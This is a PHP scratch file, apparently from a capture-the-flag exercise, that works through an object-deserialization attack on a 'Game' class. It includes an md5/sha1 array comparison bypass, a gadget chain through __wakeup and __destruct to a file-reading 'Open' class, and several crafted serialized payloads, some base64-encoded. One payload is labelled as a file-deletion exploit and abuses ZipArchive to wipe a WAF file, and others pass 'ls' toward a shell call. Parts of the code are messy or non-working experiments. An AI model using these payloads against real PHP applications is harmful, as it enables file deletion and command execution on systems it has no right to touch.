<?php
$a[]=123;
$b[]=124;
if($a!==$b){
    if(md5($a) === md5($b)) {
        if(sha1($a)=== sha1($b)){
            echo "hi";
            }
        else {
            echo "sha1";
        }
    }
        else{ 
            echo "md5";
        }
    
}
        else {
            echo "!=";
    }
    class Game{
    public  $username;
    public  $password;
    public  $choice;
    public  $register;

    public  $file;
    public  $filename;
    public  $content;
    
    public function __construct()
    {
        $this->username='user';
        $this->password='user';
    }
    
    public function __wakeup(){
        echo "wake";
    
    }
    public function __destruct() {
            echo "over";
        }

}
    $str="O:4:\"Game\":6:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:5:\"admin\";s:8:\"register\";s:5:\"admin\";s:4:\"file\";s:4:\"Open\";s:8:\"filename\";s:5:\"index\";s:7:\"content\";s:2:\"ls\";}";  
    ###s:4:"file";s:4:"Open";s:8:"filename";s:7:"waf.txt";s:7:"content";s:3:"123";
    ###s:8:\"register\";s:5:\"admin\";
    ##file=Open
    ###filename=waf.txt
    ###content=123
    echo $str;
    echo "\n\n".base64_encode($str)."\n\n";
    echo base64_decode("Tzo0OiJHYW1lIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjt9")."\n";
    
    @unserialize($str);
    echo $Game->username;
?>



# ——V2——-

<?php

class Game{
    public  $username;
    public  $password;
    public  $choice;
    public  $register;

    public  $file;
    public  $filename;
    public  $content;
    
    public function __construct()
    {
        $this->username='user';
        $this->password='user';
    }
    
    public function __wakeup(){
        if(md5($this->register)==="21232f297a57a5a743894a0e4a801fc3"){
            $this->choice=new login($this->file,$this->filename,$this->content);
        }else{
            $this->choice = new register();
        }
    }
    public function __destruct() {
        $this->choice->checking($this->username,$this->password);
    }

}
class login{
    public $file;
    public $filename;
    public $content;

    public function __construct($file,$filename,$content)
    {
        //echo $file;
        $this->file=$file;
        //echo $this->file;
        $this->filename=$filename;
        $this->content=$content;
    }
    public function checking($username,$password)
    {
        if($username==='admin'&&$password==='admin'){
            echo $this->file." ".$this->filename." ".$this->content;
//            $this->file->open($this->filename,$this->content);
            //$this->file=new Open();
            //echo strlen("new Open();");
            $this->file->open($this->filename,$this->content);
            
            die('login success you can to open shell file!');
        }
    }
}
class register{
    public function checking($username,$password)
    {
        if($username==='admin'&&$password==='admin'){
            die('success register admin');
        }else{
            die('please register admin ');
        }
    }
}
class Open{
    function open($filename, $content){
        echo "hi\n";
        if(0){
            shell($content);
        }else{
            echo "\n".$filename.".php\n";
            echo file_get_contents($filename.".php");
        }
    }
}

删除文件exp
O:4:"Game":7:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:6:"choice";O:5:"login":3:{s:4:"file";N;s:8:"filename";N;s:7:"content";N;}s:8:"register";s:5:"admin";s:4:"file";O:10:"ZipArchive":5:{s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:0:"";}s:8:"filename";s:7:"waf.txt";s:7:"content";i:8;}


    $payload="O:4:\"Game\":7:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:5:\"admin\";s:8:\"register\";s:5:\"admin\";s:4:\"file\";s:5:\"\$Open\";s:8:\"filename\";s:5:\"shell\";s:7:\"content\";s:2:\"ls\";s:6:\"choice\";s:11:\"new Open();\"}";  
    $payload=base64_encode($payload);
    echo "\n".$payload."\n";
    #$payload="Tzo0OiJHYW1lIjo2OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO3M6NDoiT3BlbiI7czo4OiJmaWxlbmFtZSI7czo1OiJpbmRleCI7czo3OiJjb250ZW50IjtzOjI6ImxzIjt9";
​    @unserialize(base64_decode($payload));
​    
?>